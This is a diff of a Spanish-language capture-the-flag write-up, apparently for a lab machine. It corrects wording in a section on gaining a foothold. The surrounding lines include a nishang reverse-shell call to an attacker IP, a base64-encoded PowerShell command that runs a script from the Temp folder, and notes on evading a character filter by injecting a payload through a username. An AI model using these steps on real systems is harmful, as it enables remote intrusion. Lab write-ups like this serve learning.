@@ -146,7 +146,7 @@ Intentando utilizar el típico oneliner powershell de [RevShells.com](https://ww
 ![Write-up Image](images/Screenshot_16.png)
 
 # Foothold
-Por lo cual tiene que haber algún carácter que considera malicioso y en caso debe de ser `-`
+Por lo cual tiene que haber algún carácter que considera malicioso y en este caso debe de ser `-`
 
 Después de probar un rato intentando forjar mi propio oneliner me encontré con este post que explica una cosa importante a la hora de generar el base64.
 https://nvd.codes/post/correctly-encode-powershell-payloads-for-exploits/
@@ -162,7 +162,7 @@ Podemos ver que el payload es distinto
 Haciendo una prueba en local vemos que ahora si que recibimos algo...
 ![Write-up Image](images/Screenshot_18.png)
 
-Ahora falta una manera para poder crear un usuario con nuestro payload...
+Ahora falta una manera para poder crear un usuario utilizando como nombre de usuario nuestro payload...
 
 También detecté que probablemente haya una restricción en la longitud del nombre de usuario.
 
@@ -185,7 +185,7 @@ Este script es el típico `Invoke-PowerShellTcp.ps1` de `nishang` pero agregando
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.50 -Port 443
 ```
 
-Ahora solo falta crear el script descargado...
+Ahora solo falta ejecutar el script descargado...
 ```shell
 echo 'powershell C:\Windows\Temp\r.ps1' | iconv -t UTF-16LE | base64 -w 0
 cABvAHcAZQByAHMAaABlAGwAbAAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcgAuAHAAcwAxAAoA
